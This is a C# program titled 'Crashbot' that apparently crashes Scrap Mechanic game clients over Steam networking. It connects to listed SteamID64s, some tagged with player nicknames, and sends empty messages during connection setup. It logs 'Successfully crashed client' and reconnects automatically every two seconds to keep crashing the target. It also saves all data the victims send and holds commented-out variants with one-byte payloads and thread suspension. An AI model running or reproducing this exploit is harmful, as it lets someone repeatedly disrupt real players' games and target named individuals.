using ScrapMechanic;
using Steamworks;
using ScrapMechanic.Networking;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Concurrent;
using System.Threading;
using System;
using ScrapMechanic.Util;

namespace ClientCli
{

    internal class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern uint GetCurrentThreadId();

        [Flags]
        public enum ThreadAccess
        {
            SUSPEND_RESUME = 0x0002
        }

        private static ulong[] steamids = [
            // 76561198359772034, // stood
            // 76561198299556567, // theguy920
            // 76561198422873503, // unknown
            // 76561198014346778, // Durf
            // 76561198018743729, // Fant
            // 76561198977226540, // Logic
            // 76561198318189561, // Dart frog
            // 76561198087792125, // sheggy
            76561198000662213, // scrap man
            // 76561198004277014, // kan
            // 76561198079775050, // kosmo
            // 76561197965646622, // moonbo
            // 76561198379446851, // Donut
        ];

        private static readonly int MaxVerbosity = Enum.GetValues<Logger.Verbosity>().Cast<int>().Max();

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            while (args.Length > 0)
            {
                int cnt = Math.Min(2, args.Length);
                var kvp = args.Take(cnt);
                args = args.Skip(cnt).ToArray();
                string key = kvp.ElementAtOrDefault(0).Trim();
                string value = kvp.ElementAtOrDefault(1).Trim();

                switch (key)
                {
                    case "-v":
                    case "--verbosity":
                        if (Enum.TryParse(value, true, out Logger.Verbosity v))
                            Logger.LogVerbosity = v;
                        else if (int.TryParse(value, out int enm))
                            Logger.LogVerbosity = (Logger.Verbosity)Math.Min(MaxVerbosity, Math.Abs(enm));
                        break;
                    case "-u":
                    case "--user":
                        steamids = [.. steamids, ulong.Parse(value)];
                        break;
                    case "-h":
                    case "--help":
                        Logger.Log("Usage: Crashbot [-v|--verbosity <verbosity>] [-u|--user <steamid64>] [-h|--help]");
                        Logger.Log("Verbosity levels: None = 0, Minimal = 1, Normal = 2, Verbose = 3, Debug = 4");
                        Logger.Log("Additional Users: There is no limit on how many users can be added via the cli");
                        return;
                }
            }

            // Task.Delay(100).Wait();
            // WhitelistCurrentThreads();

            var client = Client.Load();
            Logger.LogInfo("Press 'q' to quit");
            Logger.LogInfo($"Loaded local client: '{client.Name}' ({client.SteamID})");
            var csteamids = steamids.Select(sid => new CSteamID(sid)).ToArray();

            bool pause_reconnect = false;
            //ConcurrentDictionary<CSteamID, bool> reconnecttricks = [];
            
            client.OnConnectionStatusChanged += (_SteamId, _Connection, _Status) =>
            {
                if (_Status.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connecting)
                    Logger.LogWarning($"Connection status changed for {_SteamId}: {_Status.m_eState}");

                if (_Status.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally)
                    Logger.LogError($"Successfully crashed client: {_SteamId}");

                if (!_Status.IsConnectionAlive() && !pause_reconnect)
                    Task.Delay(2_000).ContinueWith(_ => client.ConnectToUserAsync(_SteamId));

                /*if (_Status.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_FindingRoute 
                    && reconnecttricks.GetOrAdd(_SteamId, false) == false)
                {
                    reconnecttricks[_SteamId] = true;
                    Task.Delay(100).ContinueWith(_ => client.ConnectToUserAsync(_SteamId, false));
                }*/

                if (_Status.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_FindingRoute)
                {
                    SteamNetworkingSockets.SendMessageToConnection(_Connection, 0, 0, 0, out _);
                    SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
                    /*
                    unsafe
                    {
                        fixed (byte* p = new byte[] { 1 })
                        {
                            IntPtr ptr = (IntPtr)p;
                            SteamNetworkingSockets.SendMessageToConnection(_Connection, ptr, 1, 8, out _);
                            SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
                        }
                    }*/
                }

                if (_Status.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                {
                    SteamNetworkingSockets.SendMessageToConnection(_Connection, 0, 0, 0, out _);
                    //reconnecttricks[_SteamId] = false;
                    //return;
                    //SteamNetworkingSockets.SendMessageToConnection(_Connection, 0, 0, 0, out _);
                    /*unsafe
                    {
                        fixed (byte* p = new byte[] { 1 })
                        {
                            IntPtr ptr = (IntPtr)p;
                            //var tid = GetCurrentThreadId();
                            SteamNetworkingSockets.SendMessageToConnection(_Connection, ptr, 1, 8, out _);
                            SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
                            //SuspendAllThreads(tid);
                        }
                    }
                    /*
                    Task.Run(() =>
                    {
                        unsafe
                        {
                            fixed (byte* p = new byte[] { 1 })
                            {
                                IntPtr ptr = (IntPtr)p;
                                var tid = GetCurrentThreadId();
                                SteamNetworkingSockets.SendMessageToConnection(_Connection, ptr, 1, 8, out _);
                                SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
                                SuspendAllThreads(tid);
                            }
                        }

                        Task.Delay(8_000).ContinueWith(_ =>
                        {
                            ResumeAllThreads();
                        }).Wait();
                    });*/
                    // Task.Delay(10_000).ContinueWith(t => SteamNetworkingSockets.SendMessageToConnection(_Connection, 0, 0, 0, out _));
                }
            };

            Directory.CreateDirectory("binaries");
            client.OnConnectionMessageReceived += (_SteamId, _Connection, _Message) =>
            {
                int dataLength = _Message.m_cbSize;
                Logger.LogInfo($"Received message from {_SteamId}: {dataLength} bytes");
                byte[] byteArray = new byte[dataLength];
                System.Runtime.InteropServices.Marshal.Copy(_Message.m_pData, byteArray, 0, dataLength);
                if (dataLength < 25)
                    Logger.LogWarning($"Data: {string.Join(" ", byteArray.Select(b => "0x" + b.ToString("X2")))}");

                File.WriteAllBytes($"binaries/{_SteamId}-{_Message.m_conn.m_HSteamNetConnection}.bin", byteArray);
                /*
                if (byteArray.Length == 1 && byteArray[0] == 5)
                {
                    unsafe
                    {
                        fixed (byte* p = new byte[] { 1 })
                        {
                            IntPtr ptr = (IntPtr)p;
                            SteamNetworkingSockets.SendMessageToConnection(_Connection, ptr, 1, 8, out _);
                            SteamNetworkingSockets.FlushMessagesOnConnection(_Connection);
                        }
                    }
                }*/
            };

            foreach (var csid in csteamids)
                client.ConnectToUserAsync(csid);

            while (true)
            {
                var key = Console.ReadKey();
                Console.CursorLeft -= 1;

                if (key.Key == ConsoleKey.Q)
                {
                    Logger.Log("Quitting...");
                    break;
                }

                if (key.Key == ConsoleKey.P)
                {
                    pause_reconnect = !pause_reconnect;
                    Logger.LogInfo($"Reconnects are now {(pause_reconnect ? "paused" : "resumed")}");

                    if (!pause_reconnect)
                        foreach (var csid in csteamids)
                            client.ConnectToUserAsync(csid);
                }
            }

            client.CloseAllConnections();
            client = null;
        }

        private static readonly ConcurrentBag<IntPtr> Threads = [];
        public static readonly ConcurrentBag<int> WhiteList = [];

        public static void WhitelistCurrentThreads()
        {
            Process process = Process.GetCurrentProcess();
            foreach (ProcessThread pThread in process.Threads)
                WhiteList.Add(pThread.Id);
        }

        public static void SuspendAllThreads(uint skip)
        {
            Process process = Process.GetCurrentProcess();
            Threads.Clear();
            var current_tid = GetCurrentThreadId();

            foreach (ProcessThread pThread in process.Threads)
            {
                if (pThread.Id == skip || pThread.Id == current_tid || Logger.ThreadId == pThread.Id
                    || WhiteList.Contains(pThread.Id))
                    continue;

                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pThread.Id);

                if (pOpenThread == IntPtr.Zero)
                    continue;

                // Suspend the thread
                Logger.LogWarning($"Suspended thread: {pOpenThread}");
                _ = SuspendThread(pOpenThread);

                Threads.Add(pOpenThread);
            }
        }

        public static void ResumeAllThreads()
        {
            foreach (IntPtr pOpenThread in Threads)
            {
                if (pOpenThread == IntPtr.Zero)
                    continue;

                // Resume the thread
                _ = ResumeThread(pOpenThread);
                Logger.LogWarning($"Resumed thread: {pOpenThread}");
            }

            Threads.Clear();
        }
    }
}
